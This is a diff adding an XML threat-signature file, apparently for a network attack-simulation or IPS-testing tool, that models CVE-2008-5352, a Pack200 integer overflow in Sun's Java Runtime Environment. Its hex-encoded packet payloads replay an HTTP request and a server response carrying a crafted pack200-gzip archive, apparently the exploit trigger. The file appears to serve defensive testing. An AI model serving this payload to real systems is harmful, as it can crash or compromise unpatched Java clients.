@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Sun Java Runtime Environment Pack200 Decompression Integer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists an integer overflow vulnerability in Sun Java Runtime Environment software. The vulnerability is due to insufficient validation while decompressing Pack200 (jar.pack.gz) files. A remote attacker can exploit this vulnerability by enticing a target user to open a crafted HTML file. Successful exploitation may lead to arbitrary code execution on the target.            In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the logged in user.            In an attack case where code injection is not successful, the affected process will terminate abnormally. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="INTEGER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Sun_Microsystems"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Sun_Microsystems_Sun_Microsystems_Java_Runtime_Environment_(JRE)"/>
+      <item value="Sun_Microsystems_Sun_Microsystems_Java_Development_Kit_(JDK)"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Sun_Microsystems_Java_Runtime_Environment_(JRE)_prior_to_1.6_update_11"/>
+      <item value="Sun_Microsystems_Java_Runtime_Environment_(JRE)_prior_to_1.5_update_17"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20081204-16"/>
+    <CVEID display="true" value="CVE-2008-5352"/>
+    <bugtraqID display="true" value="32608"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="181d162899a395340bb22afee6b36076"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1240005013"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1239995894" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="U"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="V"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="W"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="X"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Y"/>
+  </Variables>
+  <Loops>
+    <for index="N">
+      <for index="U"/>
+      <for index="V"/>
+      <for index="W"/>
+      <for index="X"/>
+      <for index="Y"/>
+    </for>
+    <for index="Q"/>
+  </Loops>
+  <PostScript/>
+  <Output index="N" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="C13D27A6" AckNumber="FE22BE2F" HeaderLength="05" WindowSize="FAF0" Checksum="E4F1" UrgentPointer="0000" Options="" Payload="474554202F546963546163546F652E636C61737320485454502F312E310D0A557365722D4167656E743A204D6F7A696C6C612F342E30202857696E646F777320585020352E3129204A6176612F312E362E305F31300D0A486F73743A203137322E31362E382E3137300D0A4163636570743A20746578742F68746D6C2C20696D6167652F6769662C20696D6167652F6A7065672C202A3B20713D2E322C202A2F2A3B20713D2E320D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="Q" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="FE22BE2F" AckNumber="C13D2869" HeaderLength="05" WindowSize="1920" Checksum="BE60" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2031382046656220323030392031363A32373A343520474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205475652C2031372046656220323030392031393A31393A323120474D540D0A455461673A20223330303036372D6230302D34363332323265323432303430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D456E636F64696E673A207061636B3230302D677A69700D0A436F6E74656E742D4C656E6774683A203235380D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D6A6176612D617263686976650D0A0D0A1F8B08000000000000003BF5EF022FE3822F0C0C47FF0001C3B517B79EB831F330323331313232303018810806214106116136663646264E6E4601364E160DCD309BCCBCCC123B471F6B5FD710475D4F3F377D5F473F4F37D7E0103D5FB7C4ACC4B244FD9CC4BC747DFFA4ACD4E492E092A2CCBCF482FC64BDE49CC4E2627D208B998391898395918F93819185018C999880F481BF320FFECA30001D00E4336B3DD7123ABBF13FD00DAC6C5C0C6E0C3D0CDD8C8CCCBE89799969A9C525BA61A945C599F979560A867A06BC5CCE45A98925A929BA4E952001333D837803058DE0D23C05DFCCE4A2FCE2CAE292D4DC6205CFBC643D4D5E2E5E2E0088D57BD8FB000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
